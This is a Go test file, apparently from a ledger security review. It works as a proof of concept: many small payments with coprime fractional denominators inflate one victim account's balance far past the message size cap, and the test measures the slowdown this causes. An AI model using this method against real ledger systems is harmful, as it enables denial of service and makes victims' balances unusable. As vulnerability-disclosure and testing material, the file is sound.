package ledger

import (
	"math/big"
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/signing"
)

// PoC (ledger-transition review): MaxMessageBytes bounds ONE payment's serialized size, but nothing
// bounds an account BALANCE's size. Amounts with pairwise-coprime denominators accumulate: the
// balance's denominator becomes their LCM, growing by ~the full per-message digit budget per payment.
// Every LedgerState.Digest RatString-encodes every balance (several times per block per node), and
// Rat Add/Cmp on such a balance pay big-number multiply + GCD costs that grow super-linearly. The
// owner cannot even normalise the balance away: an amount carrying that denominator no longer fits
// the per-message cap. This measures growth after K individually-in-bound payments (default cost
// 0.1, MaxMessageBytes 2000) and FAILS when one balance's encoding exceeds 100x the message cap.
func TestPoCBalanceRepresentationGrowsPastMessageCap(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	payer, _ := signing.Generate(scheme, network)
	A := payer.PublicKeyBase64()
	cost := rat("0.1")
	const maxMessageBytes = 2000

	// d_i = base + i: consecutive integers are pairwise coprime up to small factors.
	base := new(big.Int).Lsh(big.NewInt(1), 2600)
	base.Add(base, big.NewInt(1))
	amountFor := func(i int) *big.Rat {
		d := new(big.Int).Add(base, big.NewInt(int64(i)))
		return new(big.Rat).Add(cost, new(big.Rat).SetFrac(big.NewInt(1), d)) // cost + 1/d_i
	}
	// One representative payment is within the governed cap.
	sample, _ := SignPayment(payer, Payment{PublicKeyFrom: A, PublicKeyTo: "VICTIM-KEY-0000000000000000000000000000000000", Amount: amountFor(0), BlockID: 1, Comment: ""})
	if !WithinMessageBound(maxMessageBytes, sample) {
		t.Fatal("setup: the per-payment amount must fit the default message cap")
	}

	accounts := []Account{
		{PublicKey: A, Amount: rat("100000"), ValidatorNode: A},
		{PublicKey: "VICTIM-KEY-0000000000000000000000000000000000", Amount: rat("10"), ValidatorNode: "V"},
	}
	const perBlock, blocks = 100, 10
	for b := 0; b < blocks; b++ {
		var ps []Payment
		for j := 0; j < perBlock; j++ {
			i := b*perBlock + j
			ps = append(ps, Payment{PublicKeyFrom: A, PublicKeyTo: "VICTIM-KEY-0000000000000000000000000000000000", Amount: amountFor(i), Comment: string(rune('a' + j%26))})
		}
		start := time.Now()
		accounts = ProcessPayments(accounts, ps, cost)
		procDur := time.Since(start)
		start = time.Now()
		_ = StateDigest(accounts)
		digDur := time.Since(start)
		v := balance(accounts, "VICTIM-KEY-0000000000000000000000000000000000")
		t.Logf("after %4d payments: victim balance encodes to %7d bytes; ProcessPayments(block)=%v StateDigest=%v",
			(b+1)*perBlock, len(v.RatString()), procDur.Round(time.Millisecond), digDur.Round(time.Millisecond))
	}
	// Cost of one ordinary small payment touching the bloated balance.
	start := time.Now()
	_ = ProcessPayments(accounts, []Payment{{PublicKeyFrom: A, PublicKeyTo: "VICTIM-KEY-0000000000000000000000000000000000", Amount: rat("1")}}, cost)
	t.Logf("one plain 1-unit payment to the bloated account: %v", time.Since(start).Round(time.Millisecond))

	fees := new(big.Rat).Mul(cost, big.NewRat(perBlock*blocks, 1))
	encoded := len(balance(accounts, "VICTIM-KEY-0000000000000000000000000000000000").RatString())
	t.Logf("total fees spent: %s; payer balance encodes to %d bytes", fees.FloatString(1), len(balance(accounts, A).RatString()))
	if encoded > 100*maxMessageBytes {
		t.Errorf("one account balance encodes to %d bytes (> 100x the %d-byte per-message cap): the cap bounds messages, not state entries", encoded, maxMessageBytes)
	}
}
